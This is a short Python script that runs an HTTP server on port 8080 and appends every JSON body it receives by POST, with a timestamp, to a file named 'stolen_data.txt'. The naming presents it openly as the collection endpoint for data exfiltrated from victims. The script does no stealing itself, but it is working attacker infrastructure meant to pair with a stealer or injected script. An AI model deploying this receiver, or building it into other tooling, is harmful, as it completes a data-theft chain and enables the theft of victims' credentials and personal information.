from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import threading
from datetime import datetime

# Server settings
SERVER_IP = "0.0.0.0"
SERVER_PORT = 8080
LOG_FILE = "stolen_data.txt"

# Server loop
def server_loop():
    class RequestHandler(BaseHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = post_data.decode('utf-8')

            # Process and log the data
            try:
                # Parse JSON
                parsed_data = json.loads(data)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                # Log to file
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f"[{timestamp}] {parsed_data}\n")

                # Send response
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(b"Data received!")

            except Exception as e:
                self.send_response(400)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(f"Error: {str(e)}".encode())

    httpd = HTTPServer((SERVER_IP, SERVER_PORT), RequestHandler)
    print(f"Server running on port {SERVER_PORT}...")
    httpd.serve_forever()

# Start the server
if __name__ == "__main__":
    try:
        print("Server started. Ready to receive data.")
        # Run server loop on main thread so the process stays alive
        server_loop()
    except KeyboardInterrupt:
        print("Server stopped by user.")